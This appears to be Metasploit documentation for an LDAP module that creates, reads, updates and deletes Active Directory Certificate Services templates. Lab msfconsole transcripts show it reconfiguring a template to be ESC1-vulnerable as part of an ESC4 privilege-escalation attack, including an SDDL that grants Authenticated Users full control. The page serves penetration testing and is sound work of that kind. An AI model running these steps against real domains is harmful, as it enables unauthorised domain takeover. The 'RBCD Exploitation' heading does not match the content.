## RBCD Exploitation

This module can read, write, update, and delete AD CS certificate templates from a Active Directory Domain Controller.

The READ, UPDATE, and DELETE actions will write a copy of the certificate template to disk that can be restored using
the CREATE or UPDATE actions.

In order for the `auxiliary/admin/ldap/ad_cs_cert_template` module to succeed, the authenticated user must have the 
necessary permissions to perform the specified action on the target object (the certificate specified in
`CERT_TEMPLATE`).

## Lab setup

Follow the steps in the [[Installing AD CS|ad-certificates/overview.md#installing-ad-cs]] documentation.

## Module usage

The `admin/ldap/ad_cs_cert_template` module is generally used to update a certificate template as part of an ESC4 attack.

1. From msfconsole
2. Do: `use auxiliary/admin/ldap/ad_cs_cert_template`
3. Set the `RHOSTS`, `USERNAME` and `PASSWORD` options
4. Set the `CERT_TEMPLATE` option to the name of the target certificate template
5. Set the `ACTION`
   b. For the `UPDATE` action, set the `TEMPLATE_FILE` option
   c. For the `CREATE` action, optionally set the `TEMPLATE_FILE` option
6. Run the module and see the operation complete successfully

## Actions

### CREATE
Create the certificate template in the LDAP server. If no `TEMPLATE_FILE` is specified, a new certificate template will
be created based on the Microsoft-builtin `SubCA` template with a default security descriptor. If the `TEMPLATE_FILE` is
specified, the attributes it defines are merged with the `SubCA` template. This allows attributes such as the security
descriptor and name to be defined.

### READ
Read the certificate template from the LDAP server. A copy will be saved to disk.

### UPDATE
Update the certificate template in the LDAP server. The `TEMPLATE_FILE` must be specified and will be used to read
attributes to set on the certificate template object. The `TEMPLATE_FILE` option can be set to a previously stored
template file to restore the object to a previous state.

### DELETE
Delete the certificate template in the LDAP server. This is a destructive action.

## Options

### CERT_TEMPLATE
The remote certificate template name. This is used as the common name (CN) for the LDAP object.

### TEMPLATE_FILE
This is a local template file from which to read object attributes from. Two file formats are supported, JSON and YAML.
The file format is determined by the extension so the file must end in either `.json` or `.yaml`.

#### The JSON format
The JSON file format is a hash with attribute name keys and ASCII-hex encoded values. These files are compatible with
[`Certipy`'s][certipy] `template` command. This module uses the JSON file format when storing copies fo certificate to
disk.

#### The YAML format
The YAML file format is similiar to the JSON file format, but takes advantage of YAML's ability to include comments.
The file consists of a hash with attribute name keys and value strings. The `nTSecurityDescriptor` file can be either
a binary string representing a literal value, or a security descriptor defined in Microsoft's [Security Descriptor
Definition Language (SDDL)][sddl]. Premade configuration templates provided by Metasploit use this format.

## Scenarios

For steps on exploiting ESC4, see [[Exploiting ESC4|ad-certificates/attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc4-to-gain-domain-administrator-privileges]].

### Creating A Certificate Template

In this scenario, the operator uses the module to create a new certificate template. Either the default local template
can be used to make one vulnerable to ESC1, or a previously saved configuration can be used. In the following example,
the `TEMPLATE_FILE` option is used to restore the settings from a previously deleted template.

```msf
msf6 auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME aliddle
USERNAME => aliddle
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD Password1!
PASSWORD => Password1!
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE ESC4-Test
CERT_TEMPLATE => ESC4-Test
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION CREATE
ACTION => CREATE
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set TEMPLATE_FILE /home/smcintyre/.msf4/loot/20230505102851_default_192.168.159.10_windows.ad.cs.te_242316.json
TEMPLATE_FILE => /home/smcintyre/.msf4/loot/20230505102851_default_192.168.159.10_windows.ad.cs.te_242316.json
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
[*] Running module against 192.168.159.10

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[*] 192.168.159.10:389 Getting root DSE
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[*] Creating: CN=ESC4-Test,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=msflab,DC=local
[+] The operation completed successfully!
[*] Auxiliary module execution completed
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > 
```

### Deleting A Certificate Template

In this scenario, the operator uses the module to delete the `ESC4-Test` certificate template. A backup of the original
certificate's data is made before it is deleted. This file can be used with the `CREATE` action to restore the
certificate template.

```msf
msf6 auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME aliddle
USERNAME => aliddle
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD Password1!
PASSWORD => Password1!
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE ESC4-Test
CERT_TEMPLATE => ESC4-Test
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION DELETE 
ACTION => DELETE
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
[*] Running module against 192.168.159.10

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[*] 192.168.159.10:389 Getting root DSE
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[+] Read certificate template data for: CN=ESC4-Test,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=msflab,DC=local
[*] Certificate template data written to: /home/smcintyre/.msf4/loot/20230505102851_default_192.168.159.10_windows.ad.cs.te_242316.json
[+] The operation completed successfully!
[*] Auxiliary module execution completed
msf6 auxiliary(admin/ldap/ad_cs_cert_template) >
```

### Reading A Certificate Template

In this scenario, the operator uses the module to read the configuration of the default `User` certificate template.

```msf
msf6 auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME aliddle
USERNAME => aliddle
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD Password1!
PASSWORD => Password1!
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE User
CERT_TEMPLATE => User
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION READ
ACTION => READ
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
[*] Running module against 192.168.159.10

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[*] 192.168.159.10:389 Getting root DSE
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[+] Read certificate template data for: CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=msflab,DC=local
[*] Certificate template data written to: /home/smcintyre/.msf4/loot/20230505125728_default_192.168.159.10_windows.ad.cs.te_691087.json
[*] Certificate Template:
[*]   distinguishedName: CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=msflab,DC=local
[*]   displayName:       User
[*]   objectGUID:        ceed9142-d00f-459e-9694-02eb59ea1ec8
[*]   msPKI-Certificate-Name-Flag: 0xa6000000
[*]     * CT_FLAG_SUBJECT_ALT_REQUIRE_UPN
[*]     * CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL
[*]     * CT_FLAG_SUBJECT_REQUIRE_EMAIL
[*]     * CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH
[*]   msPKI-Enrollment-Flag: 0x00000029
[*]     * CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS
[*]     * CT_FLAG_PUBLISH_TO_DS
[*]     * CT_FLAG_AUTO_ENROLLMENT
[*]   msPKI-RA-Signature: 0x00000000
[*]   pKIExtendedUsage:
[*]     * 1.3.6.1.4.1.311.10.3.4
[*]     * 1.3.6.1.5.5.7.3.4
[*]     * 1.3.6.1.5.5.7.3.2
[+] The operation completed successfully!
[*] Auxiliary module execution completed
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > 
```

### Updating A Certificate Template

In this scenario, the operator uses the module to update and reconfigure the `ESC4-Test` certificate template to make it
vulnerable to ESC1 (the default template settings). This process first makes a backup of the certificate data that can
be used later. The local certificate template data can be modified to set a custom security descriptor.

```msf
msf6 auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME aliddle
USERNAME => aliddle
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD Password1!
PASSWORD => Password1!
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE ESC4-Test
CERT_TEMPLATE => ESC4-Test
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION UPDATE 
ACTION => UPDATE
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set VERBOSE true 
VERBOSE => true
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
[*] Running module against 192.168.159.10

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[*] 192.168.159.10:389 Getting root DSE
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[+] Read certificate template data for: CN=ESC4-Test,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=msflab,DC=local
[*] Certificate template data written to: /home/smcintyre/.msf4/loot/20230505083802_default_192.168.159.10_windows.ad.cs.te_593597.json
[*] Parsing SDDL text: D:PAI(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AU)
[+] The operation completed successfully!
[*] Auxiliary module execution completed
msf6 auxiliary(admin/ldap/ad_cs_cert_template) > 
```

[certipy]: https://github.com/ly4k/Certipy
[sddl]: https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language
